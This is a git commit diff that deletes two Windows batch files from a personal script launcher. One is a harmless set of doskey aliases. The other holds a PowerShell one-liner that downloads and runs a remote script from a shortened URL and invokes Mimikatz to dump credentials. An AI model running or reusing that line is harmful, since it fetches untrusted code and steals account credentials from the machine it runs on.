cef5faededc746c909701883ba0daee05ef77c55
NKLSoft-PC <45975660+NKLSoft-PC@users.noreply.github.com>
2019-06-16 06:29:05 -0400

    *

--- Batch-Launcher/bin/SCRIPTS/PWSH-DownloadString.cmd
+++
@@ -1,1 +0,0 @@
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
--- Batch-Launcher/bin/SCRIPTS/env.cmd
+++
@@ -1,4 +0,0 @@
-@echo off
-doskey gl=git log --oneline --graph --decorate --all $*
-doskey sl=C:\portableApplications\Sublime\sublime_text.exe $*
-doskey ls=ls --color=auto -laF $*
